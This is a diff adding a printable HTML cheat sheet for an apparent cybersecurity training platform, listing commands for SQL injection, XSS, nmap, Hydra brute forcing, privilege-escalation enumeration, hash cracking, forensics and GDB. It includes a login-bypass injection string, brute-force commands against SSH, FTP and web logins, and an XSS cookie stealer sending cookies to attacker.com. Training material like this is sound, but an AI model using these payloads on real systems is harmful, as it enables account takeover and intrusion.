@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberRange - Command Reference Card</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #f0f0f0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: rgba(233, 69, 96, 0.1);
+            border-radius: 10px;
+            border-left: 5px solid #e94560;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: #e94560;
+        }
+
+        header p {
+            font-size: 1.1em;
+            color: #b0b0b0;
+        }
+
+        .print-info {
+            text-align: right;
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-bottom: 10px;
+        }
+
+        @media print {
+            .print-info {
+                display: none;
+            }
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: #0f3460;
+            border: 1px solid rgba(233, 69, 96, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(233, 69, 96, 0.2);
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #e94560 0%, #c7304a 100%);
+            padding: 15px 20px;
+            color: white;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .command-group {
+            margin-bottom: 15px;
+        }
+
+        .command-title {
+            font-weight: bold;
+            color: #6eb5d0;
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+
+        pre {
+            background: #1e1e2e;
+            border: 1px solid #495057;
+            border-radius: 5px;
+            padding: 12px;
+            overflow-x: auto;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+
+        code {
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+        }
+
+        .description {
+            font-size: 0.9em;
+            color: #b0b0b0;
+            margin-top: 8px;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            border-left: 3px solid #6eb5d0;
+            border-radius: 3px;
+        }
+
+        .tool-list {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .tool-item {
+            background: rgba(110, 181, 208, 0.1);
+            border-left: 3px solid #6eb5d0;
+            padding: 10px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(233, 69, 96, 0.2);
+            color: #e94560;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            margin-right: 5px;
+            margin-bottom: 5px;
+        }
+
+        .category-label {
+            display: inline-block;
+            background: #1a472a;
+            color: #28a745;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        .tip {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+
+        .warning {
+            background: rgba(220, 53, 69, 0.1);
+            border-left: 4px solid #dc3545;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+
+        .table-command {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+
+        .table-command th,
+        .table-command td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #495057;
+        }
+
+        .table-command th {
+            background: rgba(233, 69, 96, 0.2);
+            color: #e94560;
+            font-weight: bold;
+        }
+
+        .table-command tr:nth-child(even) {
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .shortcut-keys {
+            display: flex;
+            gap: 5px;
+            margin: 5px 0;
+        }
+
+        kbd {
+            background: #2a2a3e;
+            border: 1px solid #495057;
+            border-radius: 3px;
+            padding: 3px 6px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #6c757d;
+            border-top: 1px solid #495057;
+            margin-top: 40px;
+        }
+
+        .section-title {
+            font-size: 1.8em;
+            color: #e94560;
+            margin: 30px 0 20px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(233, 69, 96, 0.3);
+        }
+
+        @media print {
+            body {
+                padding: 10px;
+            }
+
+            .card {
+                page-break-inside: avoid;
+            }
+
+            header {
+                margin-bottom: 20px;
+            }
+
+            .print-button {
+                display: none;
+            }
+        }
+
+        .print-button {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            z-index: 1000;
+        }
+
+        .print-button:hover {
+            background: #c7304a;
+        }
+    </style>
+</head>
+<body>
+    <button class="print-button" onclick="window.print()"><i class="fas fa-print"></i> Print</button>
+
+    <div class="container">
+        <header>
+            <h1>🖥️ CyberRange Command Reference Card</h1>
+            <p>Quick reference guide for cybersecurity tools and commands</p>
+            <div class="print-info">Last Updated: November 2024 | Print-friendly version available</div>
+        </header>
+
+        <!-- Web Security Section -->
+        <h2 class="section-title"><i class="fas fa-globe"></i> Web Security</h2>
+        
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-database"></i> SQL Injection
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Web Security</span>
+                    <div class="command-group">
+                        <div class="command-title">Basic SQL Injection Test</div>
+                        <pre><code>username: ' OR '1'='1
+password: anything</code></pre>
+                        <div class="description">Bypass login forms by manipulating SQL queries</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">SQLmap Scan</div>
+                        <pre><code>sqlmap -u "http://target.com/page.php?id=1" -p id</code></pre>
+                        <div class="description">Automated SQL injection detection and exploitation</div>
+                    </div>
+                    <div class="tip">
+                        💡 <strong>Tip:</strong> Always use proper input validation and parameterized queries to prevent SQL injection!
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-bug"></i> Cross-Site Scripting (XSS)
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Web Security</span>
+                    <div class="command-group">
+                        <div class="command-title">Basic XSS Payload</div>
+                        <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                        <div class="description">Test for reflected XSS vulnerabilities</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Cookie Stealer</div>
+                        <pre><code>&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+                        <div class="description">Steal session cookies from users</div>
+                    </div>
+                    <div class="tool-list">
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Browser DevTools</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Burp Suite</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> OWASP ZAP</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> BeEF</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Network Security Section -->
+        <h2 class="section-title"><i class="fas fa-network-wired"></i> Network Security</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-map"></i> Nmap - Port Scanning
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Network Security</span>
+                    <table class="table-command">
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>nmap target.com</code></td>
+                                <td>Basic scan</td>
+                            </tr>
+                            <tr>
+                                <td><code>nmap -sV target.com</code></td>
+                                <td>Version detection</td>
+                            </tr>
+                            <tr>
+                                <td><code>nmap -A target.com</code></td>
+                                <td>Aggressive scan</td>
+                            </tr>
+                            <tr>
+                                <td><code>nmap -O target.com</code></td>
+                                <td>OS detection</td>
+                            </tr>
+                            <tr>
+                                <td><code>nmap -p- target.com</code></td>
+                                <td>All ports</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <div class="tip">
+                        💡 <strong>Tip:</strong> Use -sn flag for ping sweep to discover live hosts
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-key"></i> Hydra - Password Cracking
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Network Security</span>
+                    <div class="command-group">
+                        <div class="command-title">SSH Brute Force</div>
+                        <pre><code>hydra -l username -P wordlist.txt ssh://target.com</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">FTP Attack</div>
+                        <pre><code>hydra -l user -P passwords.txt ftp://target.com</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">HTTP POST</div>
+                        <pre><code>hydra -l admin -P words.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Failed"</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-search"></i> Wireshark - Packet Analysis
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Network Security</span>
+                    <div class="command-group">
+                        <div class="command-title">Common Filters</div>
+                        <pre><code>http               # HTTP traffic only
+tcp.port == 80    # Port 80 traffic
+ftp or smtp       # FTP or SMTP traffic</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">TShark (CLI)</div>
+                        <pre><code>tshark -r capture.pcap -Y "http.request"</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Security Section -->
+        <h2 class="section-title"><i class="fas fa-lock"></i> System Security</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-arrow-up"></i> Privilege Escalation
+                </div>
+                <div class="card-body">
+                    <span class="category-label">System Security</span>
+                    <div class="command-group">
+                        <div class="command-title">Enumeration Commands</div>
+                        <pre><code>sudo -l
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Check Capabilities</div>
+                        <pre><code>getcap -r / 2>/dev/null</code></pre>
+                    </div>
+                    <div class="warning">
+                        ⚠️ <strong>Warning:</strong> Only use these commands on systems you have permission to test!
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-terminal"></i> Linux Enumeration
+                </div>
+                <div class="card-body">
+                    <span class="category-label">System Security</span>
+                    <table class="table-command">
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Info</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>uname -a</code></td>
+                                <td>System info</td>
+                            </tr>
+                            <tr>
+                                <td><code>id</code></td>
+                                <td>Current user</td>
+                            </tr>
+                            <tr>
+                                <td><code>whoami</code></td>
+                                <td>Username</td>
+                            </tr>
+                            <tr>
+                                <td><code>ps aux</code></td>
+                                <td>Running processes</td>
+                            </tr>
+                            <tr>
+                                <td><code>cat /etc/passwd</code></td>
+                                <td>User list</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cryptography Section -->
+        <h2 class="section-title"><i class="fas fa-shield-alt"></i> Cryptography</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-key"></i> Hashcat - GPU Cracking
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Cryptography</span>
+                    <div class="command-group">
+                        <div class="command-title">Dictionary Attack (MD5)</div>
+                        <pre><code>hashcat -m 0 -a 0 hashes.txt rockyou.txt</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Brute Force</div>
+                        <pre><code>hashcat -m 0 -a 3 hashes.txt ?a?a?a?a</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Show Results</div>
+                        <pre><code>hashcat -m 0 hashes.txt --show</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-hammer"></i> John the Ripper
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Cryptography</span>
+                    <div class="command-group">
+                        <div class="command-title">Dictionary Attack</div>
+                        <pre><code>john --wordlist=rockyou.txt hashes.txt</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Specific Format</div>
+                        <pre><code>john --format=raw-md5 --wordlist=rockyou.txt hashes.txt</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Show Results</div>
+                        <pre><code>john hashes.txt --show</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Forensics Section -->
+        <h2 class="section-title"><i class="fas fa-magnifying-glass"></i> Digital Forensics</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-file-archive"></i> File Recovery Tools
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Digital Forensics</span>
+                    <div class="command-group">
+                        <div class="command-title">Foremost</div>
+                        <pre><code>foremost -i disk.img -o output/</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Binwalk</div>
+                        <pre><code>binwalk -e image.bin</code></pre>
+                    </div>
+                    <div class="command-group">
+                        <div class="command-title">Strings</div>
+                        <pre><code>strings disk.img | grep -i flag</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Reverse Engineering Section -->
+        <h2 class="section-title"><i class="fas fa-cube"></i> Reverse Engineering</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-bug"></i> GDB - GNU Debugger
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Reverse Engineering</span>
+                    <table class="table-command">
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>(gdb) run</code></td>
+                                <td>Execute program</td>
+                            </tr>
+                            <tr>
+                                <td><code>(gdb) break main</code></td>
+                                <td>Set breakpoint</td>
+                            </tr>
+                            <tr>
+                                <td><code>(gdb) disassemble main</code></td>
+                                <td>Show assembly</td>
+                            </tr>
+                            <tr>
+                                <td><code>(gdb) step</code></td>
+                                <td>Step into</td>
+                            </tr>
+                            <tr>
+                                <td><code>(gdb) continue</code></td>
+                                <td>Continue execution</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-glasses"></i> Binary Analysis Tools
+                </div>
+                <div class="card-body">
+                    <span class="category-label">Reverse Engineering</span>
+                    <div class="tool-list">
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Ghidra</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> IDA Pro</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Radare2</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Hopper</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> Strings</div>
+                        <div class="tool-item"><i class="fas fa-wrench"></i> objdump</div>
+                    </div>
+                    <div class="tip">
+                        💡 <strong>Tip:</strong> Start with strings and ltrace before diving into full disassembly
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keyboard Shortcuts Section -->
+        <h2 class="section-title"><i class="fas fa-keyboard"></i> Useful Shortcuts</h2>
+
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">Terminal Shortcuts</div>
+                <div class="card-body">
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>Ctrl</kbd>+<kbd>C</kbd>
+                        </div>
+                        <div class="description">Stop current command</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>Ctrl</kbd>+<kbd>L</kbd>
+                        </div>
+                        <div class="description">Clear screen</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>↑</kbd> / <kbd>↓</kbd>
+                        </div>
+                        <div class="description">Command history</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>Tab</kbd>
+                        </div>
+                        <div class="description">Autocomplete</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">VIM Shortcuts</div>
+                <div class="card-body">
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>i</kbd>
+                        </div>
+                        <div class="description">Insert mode</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>Esc</kbd>
+                        </div>
+                        <div class="description">Command mode</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>:</kbd><kbd>w</kbd><kbd>Enter</kbd>
+                        </div>
+                        <div class="description">Save file</div>
+                    </div>
+                    <div class="command-group">
+                        <div class="shortcut-keys">
+                            <kbd>:</kbd><kbd>q</kbd><kbd>!</kbd><kbd>Enter</kbd>
+                        </div>
+                        <div class="description">Quit without saving</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p><strong>CyberRange Command Reference Card</strong> | Cybersecurity Learning Platform</p>
+            <p>Last Updated: November 2024 | For educational purposes only</p>
+            <p>Print this page for a handy reference during challenges!</p>
+        </footer>
+    </div>
+
+    <script>
+        hljs.highlightAll();
+    </script>
+</body>
+</html>
